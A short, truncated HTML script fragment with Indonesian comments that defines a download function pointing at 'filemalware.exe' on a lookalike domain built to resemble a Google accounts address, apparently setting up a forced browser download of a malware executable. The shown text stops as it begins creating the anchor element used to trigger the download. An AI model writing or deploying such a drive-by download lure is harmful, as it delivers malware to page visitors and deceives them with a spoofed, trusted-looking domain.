    <script>
        function downloadFile() {
            // Ganti URL berikut dengan URL file yang ingin Anda unduh
            var fileUrl = 'https://long-domain-tester-accounts-subdo-tester-domain-accounts-google.commmmmmmmmm.bug.omapip.my.id/filemalware.exe';
            
            // Membuat elemen anchor untuk men-trigger unduhan
